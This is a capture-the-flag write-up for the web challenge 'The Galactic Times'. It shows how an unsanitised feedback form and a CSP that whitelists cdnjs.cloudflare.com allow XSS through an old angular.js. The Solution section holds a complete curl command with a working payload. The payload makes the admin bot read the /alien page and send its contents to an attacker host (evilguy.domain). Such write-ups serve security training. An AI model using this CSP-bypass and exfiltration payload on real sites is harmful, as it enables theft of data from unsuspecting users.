# The Galactic Times

## Problem

The Galactic Times is a monthly Alien newspaper that focuses on news from around the Galaxy. This month's issue is focused on the Human race and contains some very controversial articles. The newspaper reportedly contains a restricted endpoint with some Alien secrets. Can you find a way to view the forbidden pages?

[Task file](files/web_the_galactic_times.zip)

## Solution

We are given source code of a website, where we can leave feedback. Feedback is checked automatically by the bot via puppeteer right after we submit feedback. Flag is hardcoded on the `/alien` webpage that's only accessible from localhost.

So, we have to make this feedback checking bot to visit this page and send the flag back to us. Feedback itself isn't sanitized, but the target page is protected by CSP. Luckily, it's configuration is vulnerable due to whitelisted `cdnjs.cloudflare.com` domain. It allows us to include vulnerable script that we can use to bypass CSP. One of those scripts is old `angular.js`, which allows us to basically inject any JS and it will be executed as a part of whitelisted script:

```sh
curl "http://task.domain/api/submit" -d "feedback=<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.1.3/angular.min.js'></script><div ng-app ng-csp>{{\$eval.constructor('a=new XMLHttpRequest();a.open(\"GET\", \"/alien\", false);a.send(null);document.location.href=\"https://evilguy.domain/?flag=\".concat(btoa(a.responseText.match(/{.*}/g)))')()}}</div>"
```

After a bit, bot kindly sends us the flag.

## TL;DR

 - Input is vulnerable to XSS
 - Page is protected by CSP
 - Use whitelisted domain to bypass policy
